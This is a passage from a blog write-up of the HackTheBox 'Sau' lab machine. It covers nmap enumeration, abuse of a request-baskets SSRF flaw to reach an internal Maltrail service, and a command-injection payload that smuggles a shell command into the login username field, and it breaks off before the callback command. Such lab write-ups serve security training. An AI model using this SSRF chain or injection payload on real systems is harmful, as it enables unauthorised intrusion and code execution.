<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Sau is an easy difficulty box with a filtered http port 80, with another open tcp port 55555. The open port serves as a webpage for a request-buckets project, which has been discosed as vulnerable to SSRF. Using this, we can access the different web service on port 80, and learn that it is also using an outdated open-source project Maltrail. The Maltrail version is vulnerable to Command Injection during the login process, and so we can chain these two exploits to achieve Remote Code Execution. When establishing a reverse shell, we are user puma, which has dangerous sudo privileges. The systemctl service we can initiate as sudo is using less, which allows us to spawn a privileged shell session as root.">
<title>HackTheBox - Sau</title>

<link rel='canonical' href='http://localhost:1313/p/hackthebox-sau/'>

<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="HackTheBox - Sau">
<meta property='og:description' content="Sau is an easy difficulty box with a filtered http port 80, with another open tcp port 55555. The open port serves as a webpage for a request-buckets project, which has been discosed as vulnerable to SSRF. Using this, we can access the different web service on port 80, and learn that it is also using an outdated open-source project Maltrail. The Maltrail version is vulnerable to Command Injection during the login process, and so we can chain these two exploits to achieve Remote Code Execution. When establishing a reverse shell, we are user puma, which has dangerous sudo privileges. The systemctl service we can initiate as sudo is using less, which allows us to spawn a privileged shell session as root.">
<meta property='og:url' content='http://localhost:1313/p/hackthebox-sau/'>
<meta property='og:site_name' content='Spencer&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='SSRF' /><meta property='article:tag' content='Command Injection' /><meta property='article:tag' content='sudo' /><meta property='article:tag' content='less' /><meta property='article:published_time' content='2024-01-06T10:32:21-06:00'/><meta property='article:modified_time' content='2024-01-06T10:32:21-06:00'/><meta property='og:image' content='http://localhost:1313/p/hackthebox-sau/Sau.png' />
<meta name="twitter:title" content="HackTheBox - Sau">
<meta name="twitter:description" content="Sau is an easy difficulty box with a filtered http port 80, with another open tcp port 55555. The open port serves as a webpage for a request-buckets project, which has been discosed as vulnerable to SSRF. Using this, we can access the different web service on port 80, and learn that it is also using an outdated open-source project Maltrail. The Maltrail version is vulnerable to Command Injection during the login process, and so we can chain these two exploits to achieve Remote Code Execution. When establishing a reverse shell, we are user puma, which has dangerous sudo privileges. The systemctl service we can initiate as sudo is using less, which allows us to spawn a privileged shell session as root."><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='http://localhost:1313/p/hackthebox-sau/Sau.png' />
    <link rel="shortcut icon" href="/favicon.png" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu897059592634026878.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üç•</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/CaiJimmy/hugo-theme-stack'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/post' >
                
                
                
                <span>Posts</span>
            </a>
        </li>
        
        
        <li >
            <a href='/awards' >
                
                
                
                <span>Trophy Room</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#enumeration">Enumeration</a>
      <ol>
        <li><a href="#enumerating-web-service-on-port-55555">Enumerating web service on port 55555</a></li>
        <li><a href="#testing-ssrf-disclosed-for-request-baskets">Testing SSRF disclosed for request-baskets</a></li>
      </ol>
    </li>
    <li><a href="#foothold">Foothold</a>
      <ol>
        <li><a href="#using-ssrf-to-enumerate-the-firewalled-web-service">Using SSRF to enumerate the firewalled web service</a></li>
        <li><a href="#chain-exploiting-request-baskets-ssrf-and-maltrails-command-injection-for-rce">Chain exploiting request-basket&rsquo;s SSRF and Maltrail&rsquo;s Command Injection for RCE</a></li>
      </ol>
    </li>
    <li><a href="#privilege-escalation">Privilege Escalation</a>
      <ol>
        <li><a href="#stabilizing-reverse-shell">Stabilizing reverse shell</a></li>
        <li><a href="#checking-for-additional-users-on-the-system">Checking for additional users on the system</a></li>
        <li><a href="#checking-sudo-privileges">Checking sudo privileges</a></li>
        <li><a href="#abusing-priveleged-less-session-to-spawn-a-root-shell">Abusing priveleged less session to spawn a root shell</a></li>
      </ol>
    </li>
    <li><a href="#alternative-information-gathering">Alternative information gathering</a>
      <ol>
        <li><a href="#finding-the-usage-of-less-through-help-menu">Finding the usage of less through help menu</a></li>
        <li><a href="#using-gtfobins-to-discover-how-to-abuse-less-or-systemctl">Using GTFOBins to discover how to abuse less or systemctl</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/hackthebox-sau/">
                <img src="/p/hackthebox-sau/Sau_hu9514688690326236710.png"
                        srcset="/p/hackthebox-sau/Sau_hu9514688690326236710.png 800w, /p/hackthebox-sau/Sau_hu2890627127379989291.png 1600w"
                        width="800" 
                        height="666" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Sau" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/hack-the-box/" >
                Hack the Box
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/hackthebox-sau/">HackTheBox - Sau</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            Sau is an easy difficulty box with a filtered http port 80, with another open tcp port 55555. The open port serves as a webpage for a request-buckets project, which has been discosed as vulnerable to SSRF. Using this, we can access the different web service on port 80, and learn that it is also using an outdated open-source project Maltrail. The Maltrail version is vulnerable to Command Injection during the login process, and so we can chain these two exploits to achieve Remote Code Execution. When establishing a reverse shell, we are user puma, which has dangerous sudo privileges. The systemctl service we can initiate as sudo is using less, which allows us to spawn a privileged shell session as root.
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Jan 06, 2024</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    10 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="enumeration">Enumeration
</h2><p>Initial nmap:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for 10.10.11.224
</span></span><span class="line"><span class="cl">Host is up (0.036s latency).
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE    SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey: 
</span></span><span class="line"><span class="cl">|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
</span></span><span class="line"><span class="cl">|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
</span></span><span class="line"><span class="cl">|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
</span></span><span class="line"><span class="cl">80/tcp    filtered http
</span></span><span class="line"><span class="cl">8338/tcp  filtered unknown
</span></span><span class="line"><span class="cl">55555/tcp open     unknown
</span></span><span class="line"><span class="cl">| fingerprint-strings: 
</span></span><span class="line"><span class="cl">|   FourOhFourRequest: 
</span></span><span class="line"><span class="cl">|     HTTP/1.0 400 Bad Request
</span></span><span class="line"><span class="cl">|     Content-Type: text/plain; charset=utf-8
</span></span><span class="line"><span class="cl">|     X-Content-Type-Options: nosniff
</span></span><span class="line"><span class="cl">|     Date: Fri, 05 Jan 2024 17:53:45 GMT
</span></span><span class="line"><span class="cl">|     Content-Length: 75
</span></span><span class="line"><span class="cl">|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
</span></span><span class="line"><span class="cl">|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
</span></span><span class="line"><span class="cl">|     HTTP/1.1 400 Bad Request
</span></span><span class="line"><span class="cl">|     Content-Type: text/plain; charset=utf-8
</span></span><span class="line"><span class="cl">|     Connection: close
</span></span><span class="line"><span class="cl">|     Request
</span></span><span class="line"><span class="cl">|   GetRequest: 
</span></span><span class="line"><span class="cl">|     HTTP/1.0 302 Found
</span></span><span class="line"><span class="cl">|     Content-Type: text/html; charset=utf-8
</span></span><span class="line"><span class="cl">|     Location: /web
</span></span><span class="line"><span class="cl">|     Date: Fri, 05 Jan 2024 17:53:19 GMT
</span></span><span class="line"><span class="cl">|     Content-Length: 27
</span></span><span class="line"><span class="cl">|     href=&#34;/web&#34;&gt;Found&lt;/a&gt;.
</span></span><span class="line"><span class="cl">|   HTTPOptions: 
</span></span><span class="line"><span class="cl">|     HTTP/1.0 200 OK
</span></span><span class="line"><span class="cl">|     Allow: GET, OPTIONS
</span></span><span class="line"><span class="cl">|     Date: Fri, 05 Jan 2024 17:53:19 GMT
</span></span><span class="line"><span class="cl">|_    Content-Length: 0
</span></span><span class="line"><span class="cl">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl">SF-Port55555-TCP:V=7.94SVN%I=7%D=1/5%Time=6598420F%P=x86_64-pc-linux-gnu%r
</span></span><span class="line"><span class="cl">SF:(GetRequest,A2,&#34;HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/html
</span></span><span class="line"><span class="cl">SF:;\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Fri,\x2005\x20Jan\x
</span></span><span class="line"><span class="cl">SF:202024\x2017:53:19\x20GMT\r\nContent-Length:\x2027\r\n\r\n&lt;a\x20href=\&#34;
</span></span><span class="line"><span class="cl">SF:/web\&#34;&gt;Found&lt;/a&gt;\.\n\n&#34;)%r(GenericLines,67,&#34;HTTP/1\.1\x20400\x20Bad\x20
</span></span><span class="line"><span class="cl">SF:Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:
</span></span><span class="line"><span class="cl">SF:\x20close\r\n\r\n400\x20Bad\x20Request&#34;)%r(HTTPOptions,60,&#34;HTTP/1\.0\x2
</span></span><span class="line"><span class="cl">SF:0200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Fri,\x2005\x20Jan\x
</span></span><span class="line"><span class="cl">SF:202024\x2017:53:19\x20GMT\r\nContent-Length:\x200\r\n\r\n&#34;)%r(RTSPReque
</span></span><span class="line"><span class="cl">SF:st,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plai
</span></span><span class="line"><span class="cl">SF:n;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Reques
</span></span><span class="line"><span class="cl">SF:t&#34;)%r(Help,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
</span></span><span class="line"><span class="cl">SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
</span></span><span class="line"><span class="cl">SF:20Request&#34;)%r(SSLSessionReq,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nC
</span></span><span class="line"><span class="cl">SF:ontent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\
</span></span><span class="line"><span class="cl">SF:n\r\n400\x20Bad\x20Request&#34;)%r(TerminalServerCookie,67,&#34;HTTP/1\.1\x2040
</span></span><span class="line"><span class="cl">SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
</span></span><span class="line"><span class="cl">SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;)%r(TLSSessionReq,67
</span></span><span class="line"><span class="cl">SF:,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x2
</span></span><span class="line"><span class="cl">SF:0charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&#34;)%r
</span></span><span class="line"><span class="cl">SF:(Kerberos,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
</span></span><span class="line"><span class="cl">SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
</span></span><span class="line"><span class="cl">SF:0Request&#34;)%r(FourOhFourRequest,EA,&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r
</span></span><span class="line"><span class="cl">SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Optio
</span></span><span class="line"><span class="cl">SF:ns:\x20nosniff\r\nDate:\x20Fri,\x2005\x20Jan\x202024\x2017:53:45\x20GMT
</span></span><span class="line"><span class="cl">SF:\r\nContent-Length:\x2075\r\n\r\ninvalid\x20basket\x20name;\x20the\x20n
</span></span><span class="line"><span class="cl">SF:ame\x20does\x20not\x20match\x20pattern:\x20\^\[\\w\\d\\-_\\\.\]{1,250}\
</span></span><span class="line"><span class="cl">SF:$\n&#34;)%r(LPDString,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
</span></span><span class="line"><span class="cl">SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
</span></span><span class="line"><span class="cl">SF:20Bad\x20Request&#34;)%r(LDAPSearchReq,67,&#34;HTTP/1\.1\x20400\x20Bad\x20Reque
</span></span><span class="line"><span class="cl">SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
</span></span><span class="line"><span class="cl">SF:lose\r\n\r\n400\x20Bad\x20Request&#34;);
</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 92.13 seconds
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ports 80 and 8338 are filtered, which is rather unusual. They could just be closed, or perhaps a firewall is placed and prohibiting interaction with these ports. We can see an unusual open port 55555. Nmap enumeration output is rather confusing, but we can see that this has some http capabilities.</p>
<h3 id="enumerating-web-service-on-port-55555">Enumerating web service on port 55555
</h3><p>Viewing in firefox:</p>
<p><img src="/p/hackthebox-sau/images/landingpage.png"
	width="1420"
	height="481"
	srcset="/p/hackthebox-sau/images/landingpage_hu13663070491702725750.png 480w, /p/hackthebox-sau/images/landingpage_hu10672500233807632792.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="295"
		data-flex-basis="708px"
	
></p>
<p>We can create baskets, which appear to be url folders. Upon clicking the create button, we receive a token:</p>
<p><img src="/p/hackthebox-sau/images/basket1.png"
	width="600"
	height="217"
	srcset="/p/hackthebox-sau/images/basket1_hu16385161665970310291.png 480w, /p/hackthebox-sau/images/basket1_hu9586703559039143224.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="276"
		data-flex-basis="663px"
	
></p>
<p>When we visit our empty basket, we see instructions on how to use:</p>
<p><img src="/p/hackthebox-sau/images/emptybasket1.png"
	width="1172"
	height="391"
	srcset="/p/hackthebox-sau/images/emptybasket1_hu10344923660080456190.png 480w, /p/hackthebox-sau/images/emptybasket1_hu8136638879357211339.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="299"
		data-flex-basis="719px"
	
></p>
<p>When we visit the link, we receive an empty response. Now on our basket page, however, we can see information on the request done:</p>
<p><img src="/p/hackthebox-sau/images/basket2.png"
	width="1190"
	height="403"
	srcset="/p/hackthebox-sau/images/basket2_hu3172590455630122059.png 480w, /p/hackthebox-sau/images/basket2_hu681319821548028357.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="295"
		data-flex-basis="708px"
	
></p>
<p>On the main page, we can see that this process is using the opensource project <a class="link" href="https://github.com/darklynx/request-baskets"  target="_blank" rel="noopener"
    >request-baskets</a>:</p>
<p><img src="/p/hackthebox-sau/images/requestbaskets.png"
	width="397"
	height="66"
	srcset="/p/hackthebox-sau/images/requestbaskets_hu6739496542619475124.png 480w, /p/hackthebox-sau/images/requestbaskets_hu845911469554123256.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="601"
		data-flex-basis="1443px"
	
></p>
<h3 id="testing-ssrf-disclosed-for-request-baskets">Testing SSRF disclosed for request-baskets
</h3><p>The version is also detailed as 1.2.1, however the most recent release is v1.2.3. We can explore github release notes to see what was changed between versions, but unfortunately there is not mention of security flaws/vulnerabilities. However, using google to search version 1.2.1 provides us with <a class="link" href="https://nvd.nist.gov/vuln/detail/CVE-2023-27163"  target="_blank" rel="noopener"
    >CVE-2023-27163</a>, an SSRF type vulnerability that can be used to access internal/restricted pages.
There are two ideas I have for using this vulnerability. In initial nmap scanning, ports 80 and 8338 were displayed as filtered, perhaps this is something that cannot be accessed externally but can be reached through an SSRF approach. Alternatively, we might access an admin page requiring accessibility we normally don&rsquo;t have. When reaching /web/baskets, it expects us to supply a master token:</p>
<p><img src="/p/hackthebox-sau/images/admin1.png"
	width="603"
	height="259"
	srcset="/p/hackthebox-sau/images/admin1_hu4672351402475954230.png 480w, /p/hackthebox-sau/images/admin1_hu16890889575922867782.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="232"
		data-flex-basis="558px"
	
></p>
<p>Perhaps with SSRF, a master token would be supplied as a cookie and we can view? It is a possibility worth trying.</p>
<p><a class="link" href="https://notes.sjtu.edu.cn/s/MUUhEymt7#"  target="_blank" rel="noopener"
    >This article</a> covers the exploit details from an API request perspective, but it is not necessary with our ability to handle the GUI. In my established basket, I can edit this information from the settings cog:</p>
<p><img src="/p/hackthebox-sau/images/settings1.png"
	width="927"
	height="437"
	srcset="/p/hackthebox-sau/images/settings1_hu13043730032142146849.png 480w, /p/hackthebox-sau/images/settings1_hu5071689317827214572.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="212"
		data-flex-basis="509px"
	
></p>
<p>Just as the article states, we can set the proxy response and expand forward path, and set the forward url to localhost:</p>
<p><img src="/p/hackthebox-sau/images/settings2.png"
	width="602"
	height="386"
	srcset="/p/hackthebox-sau/images/settings2_hu17412589595425752905.png 480w, /p/hackthebox-sau/images/settings2_hu8507068098224888115.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="155"
		data-flex-basis="374px"
	
></p>
<p>Now when we visit our box, we are forwarded to a the new website on port 80!</p>
<p><img src="/p/hackthebox-sau/images/ssrf1.png"
	width="1005"
	height="366"
	srcset="/p/hackthebox-sau/images/ssrf1_hu18192445525027988509.png 480w, /p/hackthebox-sau/images/ssrf1_hu7207897851417215712.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="274"
		data-flex-basis="659px"
	
></p>
<p>It looks horrendously broken for now, but the important part is that we are able to access the internal web service despite being behind a firewall.</p>
<h2 id="foothold">Foothold
</h2><h3 id="using-ssrf-to-enumerate-the-firewalled-web-service">Using SSRF to enumerate the firewalled web service
</h3><p>From the webpage footer, we can understand that this service is using Maltrail v0.53:</p>
<p><img src="/p/hackthebox-sau/images/maltrail1.png"
	width="391"
	height="96"
	srcset="/p/hackthebox-sau/images/maltrail1_hu4977089157952643985.png 480w, /p/hackthebox-sau/images/maltrail1_hu10154399560798655467.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="407"
		data-flex-basis="977px"
	
></p>
<p>A quick google search shows that this service is <a class="link" href="https://huntr.com/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/"  target="_blank" rel="noopener"
    >vulnerable to an OS command injection vulnerability</a>. The provided article lists a very simple payload that we might use:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl &#39;http://hostname:8338/login&#39; \
</span></span><span class="line"><span class="cl">  --data &#39;username=;`id &gt; /tmp/bbq`&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Note that the supplied port is 8338, and we did see this port filtered during our nmap scan. When I check with the SSRF method, the same landing page appears as port 80. It seems that both ports are being used to listen to the same service, so we can use either one.</p>
<p>To use this exploit, the first thing we must do is point our SSRF forwarding address at the /login page:</p>
<p><img src="/p/hackthebox-sau/images/settings3.png"
	width="597"
	height="382"
	srcset="/p/hackthebox-sau/images/settings3_hu11370528168936440954.png 480w, /p/hackthebox-sau/images/settings3_hu3525192579632133269.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="156"
		data-flex-basis="375px"
	
></p>
<p>While the request can be sent via firefox, extra steps must be done to transform the request to a POST, and supplying the data. It is easier to do in curl, just as the POC suggests. As for the payload, we shouldn&rsquo;t expect to see the response if we check with <code>id</code> or <code>whoami</code>, as we are not provided with stdout. In order to confirm the RCE is working, we need to send a command that will reach back to our system. My preferred method is to check with a <code>curl</code> or <code>wget</code> request. First, we must set up a listener, either nc or python:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ nc -lp 80
</span></span></code></pre></td></tr></table>
</div>
</div><p>Next, we send the request to our bucket, with the injected curl command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
